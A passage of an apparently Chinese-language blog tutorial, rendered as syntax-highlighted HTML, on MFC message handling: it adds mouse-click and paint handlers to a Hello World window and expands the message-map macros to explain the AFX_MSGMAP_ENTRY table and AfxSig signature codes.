directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"Hello.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CMyApp theApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>BOOL <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">::</span><span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tm_pMainWnd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> CMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tm_pMainWnd<span class=\"token operator\">-></span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>m_nCmdShow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tm_pMainWnd<span class=\"token operator\">-></span><span class=\"token function\">UpdateWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">Create</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tWS_OVERLAPPED <span class=\"token operator\">|</span> WS_CAPTION <span class=\"token operator\">|</span> WS_SYSMENU <span class=\"token operator\">|</span> WS_THICKFRAME <span class=\"token operator\">|</span> WS_MAXIMIZEBOX <span class=\"token operator\">|</span> WS_VSCROLL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\">// 左上角，既起始位置是（400,300），右下角（800,700）</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// 700 -300 是高度  800-400 是宽度</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token function\">CRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">700</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>接下来演示添加一个消息。</p>\n<p>我们还是直接利用 MFC 的宏：<br />\n在 Hello.h 中的 <code>CMainWindow</code>  类中做以下修改：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMainWindow</span> <span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CFrameWnd</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// 消息映射</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">DECLARE_MESSAGE_MAP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">// 消息函数</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tafx_msg <span class=\"token keyword\">void</span> <span class=\"token function\">OnLButtonDown</span><span class=\"token punctuation\">(</span>UINT nFlags<span class=\"token punctuation\">,</span> CPoint point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tafx_msg <span class=\"token keyword\">void</span> <span class=\"token function\">OnPaint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在 Hello.cpp 中添加以下代码</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">OnLButtonDown</span><span class=\"token punctuation\">(</span>UINT nFlags<span class=\"token punctuation\">,</span> CPoint point<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">AfxMessageBox</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello Message!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">OnPaint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tCPaintDC <span class=\"token function\">dc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// 绘制文本</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tdc<span class=\"token punctuation\">.</span><span class=\"token function\">DrawText</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello OnPaint!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t<span class=\"token comment\">// 显示内容</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token function\">CRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t<span class=\"token comment\">// 显示位置</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tDT_SINGLELINE\t\t\t<span class=\"token comment\">// 单行显示</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">BEGIN_MESSAGE_MAP</span><span class=\"token punctuation\">(</span>CMainWindow<span class=\"token punctuation\">,</span> CFrameWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token comment\">// 写消息</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token function\">ON_WM_LBUTTONDOWN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token function\">ON_WM_PAINT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token function\">END_MESSAGE_MAP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在窗口中单击鼠标左键结果：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>按照这样的格式我们想添加什么消息处理都可。<br />\n但是因为是宏，使用简单，但不利于我们去了解基本原理。<br />\n例如这个左键按下的消息处理函数  <code>OnLButtonDown</code> ，这个函数名为什么要这样写？不这么写可不可以？所以我们还需要通过转换宏去了解本质。</p>\n<h2 id=\"转换宏\"><a class=\"anchor\" href=\"#转换宏\">#</a> 转换宏</h2>\n<p>我们把上面例子中所使用的的宏都给展开。</p>\n<p>我在 VS2019 中所查看的定义：</p>\n<h3 id=\"宏declare_message_map\"><a class=\"anchor\" href=\"#宏declare_message_map\">#</a> 宏 DECLARE_MESSAGE_MAP ()</h3>\n<p>转换为:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span><span class=\"token operator\">:</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> PASCAL <span class=\"token function\">GetThisMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> <span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> <span class=\"token function\">GetMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其作用是在类中定义了两个保护成员函数 <code>GetThisMessageMap</code>  和 <code>GetMessageMap</code> 。</p>\n<h3 id=\"宏begin_message_map-on_wm_lbuttondown-end_message_map\"><a class=\"anchor\" href=\"#宏begin_message_map-on_wm_lbuttondown-end_message_map\">#</a> 宏 BEGIN_MESSAGE_MAP、ON_WM_LBUTTONDOWN、END_MESSAGE_MAP</h3>\n<p>接下来转换另外的宏：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">BEGIN_MESSAGE_MAP</span><span class=\"token punctuation\">(</span>theClass<span class=\"token punctuation\">,</span> baseClass<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">// 写消息</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">ON_WM_LBUTTONDOWN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">END_MESSAGE_MAP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>BEGIN_MESSAGE_MAP(theClass, baseClass)</code>  转换为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PTM_WARNING_DISABLE </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> theClass<span class=\"token operator\">::</span><span class=\"token function\">GetMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">GetThisMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> PASCAL theClass<span class=\"token operator\">::</span><span class=\"token function\">GetThisMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">typedef</span> theClass ThisClass<span class=\"token punctuation\">;</span>\t\t\t\t\t\t   </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">typedef</span> baseClass TheBaseClass<span class=\"token punctuation\">;</span>\t\t\t\t\t   </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token function\">__pragma</span><span class=\"token punctuation\">(</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>push<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t\t   </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">__pragma</span><span class=\"token punctuation\">(</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>disable<span class=\"token operator\">:</span> <span class=\"token number\">4640</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">/* message maps can only be called by single threaded message pump */</span> \\</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> AFX_MSGMAP_ENTRY _messageEntries<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr></table></figure><p>我们暂时忽略掉处理警告的代码。</p>\n<p><code>BEGIN_MESSAGE_MAP</code>  宏，定义了两个函数，一个函数名为 <code>GetMessageMap</code> ，其功能是调用 <code>GetThisMessageMap</code> ，另一个函数便是 <code>GetThisMessageMap</code> , 这个函数中定义了一个 <code>AFX_MSGMAP_ENTRY</code>  类型的数组。</p>\n<hr />\n<p>接下转换 <code>ON_WM_LBUTTONDOWN()</code> ：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span> WM_LBUTTONDOWN<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> AfxSig_vwp<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token punctuation\">(</span>AFX_PMSG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>AFX_PMSGW<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token punctuation\">(</span><span class=\"token keyword\">static_cast</span><span class=\"token operator\">&lt;</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">&amp;</span>ThisClass <span class=\"token operator\">::</span> OnLButtonDown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr></table></figure><hr />\n<p>继续转换 <code>END_MESSAGE_MAP()</code>  ：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> AfxSig_end<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>AFX_PMSG<span class=\"token punctuation\">)</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">__pragma</span><span class=\"token punctuation\">(</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>pop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> AFX_MSGMAP messageMap <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token operator\">&amp;</span>TheBaseClass<span class=\"token operator\">::</span>GetThisMessageMap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>_messageEntries<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>messageMap<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>PTM_WARNING_RESTORE</pre></td></tr></table></figure><p><code>END_MESSAGE_MAP</code>  负责 <code>GetThisMessageMap</code>  函数的收尾</p>\n<p>而我们使用的宏：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">BEGIN_MESSAGE_MAP</span><span class=\"token punctuation\">(</span>CMainWindow<span class=\"token punctuation\">,</span> CFrameWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">// 写消息</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">ON_WM_LBUTTONDOWN</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">END_MESSAGE_MAP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>便可转换为：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>PTM_WARNING_DISABLE </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">GetMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">GetThisMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> AFX_MSGMAP<span class=\"token operator\">*</span> PASCAL <span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">GetThisMessageMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">typedef</span> CMainWindow ThisClass<span class=\"token punctuation\">;</span>\t\t\t\t\t\t   </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">typedef</span> CFrameWnd TheBaseClass<span class=\"token punctuation\">;</span>\t\t\t\t\t  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">__pragma</span><span class=\"token punctuation\">(</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>push<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">__pragma</span><span class=\"token punctuation\">(</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>disable<span class=\"token operator\">:</span> <span class=\"token number\">4640</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">/* message maps can only be called by single threaded message pump */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> AFX_MSGMAP_ENTRY _messageEntries<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span> WM_LBUTTONDOWN<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> AfxSig_vwp<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>AFX_PMSG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>AFX_PMSGW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">static_cast</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>AFX_MSG_CALL CWnd<span class=\"token operator\">::</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">,</span> CPoint<span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>ThisClass<span class=\"token operator\">::</span>OnLButtonDown<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> AfxSig_end<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>AFX_PMSG<span class=\"token punctuation\">)</span><span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">__pragma</span><span class=\"token punctuation\">(</span><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>pop<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> AFX_MSGMAP messageMap <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token operator\">&amp;</span>TheBaseClass<span class=\"token operator\">::</span>GetThisMessageMap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>_messageEntries<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>messageMap<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>PTM_WARNING_RESTORE</pre></td></tr></table></figure><p>如上代码转换完成之后就可以很清晰的知道使用宏的时候鼠标左键按下必须使用  <code>OnLButtonDown</code>  这个函数名是因为这里是写死在代码中的，没办法改变；<br />\n我们还可以很清晰的看见  <code>_messageEntries</code>  这个数组就是存放着我们的消息，这就是一个消息映射的表格，而这个数组是一个结构体数组，所以我们来看一下  <code>AFX_MSGMAP_ENTRY</code>  这个结构体。</p>\n<h2 id=\"结构体-afx_msgmap_entry\"><a class=\"anchor\" href=\"#结构体-afx_msgmap_entry\">#</a> 结构体 AFX_MSGMAP_ENTRY</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">AFX_MSGMAP_ENTRY</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    UINT nMessage<span class=\"token punctuation\">;</span>   <span class=\"token comment\">//windows message # Windows 消息类型 ID</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    UINT nCode<span class=\"token punctuation\">;</span>      <span class=\"token comment\">//control code or WM_NOTIFY code #对于窗口消息该值为 0，处理命令消息和控件通知的函数使用与此相同的消息映像。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    UINT nID<span class=\"token punctuation\">;</span>        <span class=\"token comment\">//control ID (or 0 for windows messages) #命令消息 ID 的起始范围</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    UINT nLastID<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//used for entries specifying a range of control id's #命令消息 ID 范围的终点</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    UINT nSig<span class=\"token punctuation\">;</span>       <span class=\"token comment\">//signature type (action) or pointer to message #消息的动作标识 enum AfxSig 里面的成员</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    AFX_PMSG pfn<span class=\"token punctuation\">;</span>    <span class=\"token comment\">//routine to call (or special value) #响应消息时应执行的函数</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>根据注释可以非常清晰的看见每个参数的意义，主要说下后两个参数，  <code>AFX_PMSG pfn</code>  为响应消息时执行的函数，这里也就是  <code>OnLButtonDown</code>  函数的地址， <code>UINT nSig</code>  为消息的动作标识  <code>enum AfxSig </code> 里面的成员，在当前值为 <code>AfxSig_vwp</code> ，这是一个宏，我们可以跟进查看一下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>AfxSig_vwp <span class=\"token operator\">=</span> AfxSig_v_u_p<span class=\"token punctuation\">,</span>      <span class=\"token comment\">// void (UINT, CPoint)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 54</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>AfxSig_v_u_p<span class=\"token punctuation\">,</span>\t\t\t\t\t<span class=\"token comment\">// void (UINT, CPoint)</span></pre></td></tr></table></figure><p>它表示着  <code>AFX_PMSG pfn</code> （响应消息时执行的函数）的返回值和参数的格式：</p>\n<figure class=\"highlight cpp\"><figcaption 